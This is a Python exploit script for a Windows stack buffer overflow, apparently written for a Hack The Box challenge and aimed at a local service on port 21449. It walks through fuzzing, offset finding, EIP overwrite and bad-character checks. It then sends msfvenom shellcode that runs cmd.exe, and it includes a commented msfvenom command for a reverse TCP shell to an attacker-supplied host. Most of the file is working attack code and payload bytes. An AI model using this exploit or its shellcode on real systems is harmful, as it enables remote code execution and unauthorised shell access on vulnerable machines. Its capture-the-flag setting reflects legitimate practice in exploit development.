# windows buffer overflow, no stack protections.
# Used for a HTB challenge

import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

offset = 469
buffer = b"A"*offset
eiptest = b"B"*4
eip = pack('<L', 0x621014E3)
nop = b"\x90"*32

allchars = bytes([
    
    ])

allchars_removed_bad = bytes([
    
    ])

# bad chars:
# 0x00, 0x0A, 0x0D



def remote_fuzz():
    try:
        for i in range(0, 2000, 500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
            breakpoint()
    except:
            print("Failed to connect")

def offset_checks():
    try:
        pattern = bytes("", "utf-8")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(pattern)
        s.close()
    except:
        print("Failed")

def check_control():
    payload = buffer + eip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(payload)
        s.close()
    except:
        print("failed connection")

def identify_bad_chars():
    payload = buffer + eip + allchars_removed_bad
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(payload)
        s.close()
    except:
        print("failed connection")

def exploit_cmd():
    # msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00\x0A\x0D'
    exploit =  b""
    exploit += b"\xbd\xd2\x50\xaf\x8b\xda\xd7\xd9\x74\x24\xf4\x5e"
    exploit += b"\x33\xc9\xb1\x31\x83\xc6\x04\x31\x6e\x0e\x03\xbc"
    exploit += b"\x5e\x4d\x7e\xbc\xb7\x13\x81\x3c\x48\x74\x0b\xd9"
    exploit += b"\x79\xb4\x6f\xaa\x2a\x04\xfb\xfe\xc6\xef\xa9\xea"
    exploit += b"\x5d\x9d\x65\x1d\xd5\x28\x50\x10\xe6\x01\xa0\x33"
    exploit += b"\x64\x58\xf5\x93\x55\x93\x08\xd2\x92\xce\xe1\x86"
    exploit += b"\x4b\x84\x54\x36\xff\xd0\x64\xbd\xb3\xf5\xec\x22"
    exploit += b"\x03\xf7\xdd\xf5\x1f\xae\xfd\xf4\xcc\xda\xb7\xee"
    exploit += b"\x11\xe6\x0e\x85\xe2\x9c\x90\x4f\x3b\x5c\x3e\xae"
    exploit += b"\xf3\xaf\x3e\xf7\x34\x50\x35\x01\x47\xed\x4e\xd6"
    exploit += b"\x35\x29\xda\xcc\x9e\xba\x7c\x28\x1e\x6e\x1a\xbb"
    exploit += b"\x2c\xdb\x68\xe3\x30\xda\xbd\x98\x4d\x57\x40\x4e"
    exploit += b"\xc4\x23\x67\x4a\x8c\xf0\x06\xcb\x68\x56\x36\x0b"
    exploit += b"\xd3\x07\x92\x40\xfe\x5c\xaf\x0b\x95\xa3\x3d\x36"
    exploit += b"\xdb\xa4\x3d\x38\x4c\xcd\x0c\xb3\x03\x8a\x90\x16"
    exploit += b"\x60\x64\xdb\x3a\xc1\xed\x82\xaf\x53\x70\x35\x1a"
    exploit += b"\x97\x8d\xb6\xae\x68\x6a\xa6\xdb\x6d\x36\x60\x30"
    exploit += b"\x1c\x27\x05\x36\xb3\x48\x0c\x55\x5e\xd3\x81\xfc"
    exploit += b"\xd8\x7e\xde"
    payload = buffer + eip + nop + exploit
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(payload)
        s.close()
    except:
        print("failed connection")

def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=<IP HERE> LPORT=9999 -f 'python' -b '\x00\x0A\x0D'
    exploit =  b""
    # REST OF EXPLOIT HERE
    
    payload = buffer + eip + nop + exploit
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
        s.send(payload)
        s.close()
    except:
        print("failed connection")



#remote_fuzz()
#offset_checks()
#check_control()
#identify_bad_chars()
#exploit_cmd()
exploit()